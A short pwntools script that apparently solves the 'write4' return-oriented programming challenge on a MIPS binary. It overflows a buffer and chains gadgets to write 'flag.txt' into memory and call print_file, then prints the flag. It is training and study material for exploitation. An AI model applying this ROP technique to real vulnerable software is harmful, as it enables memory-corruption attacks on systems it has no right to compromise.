from pwn import *

data = 0x00411000 # rw-
print_file = 0x00400a90 # plt
ld_a0 = 0x00400948 # lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
sw_t1_t0 = 0x00400930 # lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9
file = b"flag.txt"

payload = b"".join([
    b"A"*(32+4),
    p32(sw_t1_t0),
    b"B"*4,
    file[:4],
    p32(data),
    p32(sw_t1_t0),
    b"C"*4,
    file[4:],
    p32(data+4),
    p32(ld_a0),
    b"D"*4,
    p32(print_file),
    p32(data),
])

#p = process(["qemu-mipsel", "-g", "1234", "./write4_mipsel"])
p = process("./write4_mipsel")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
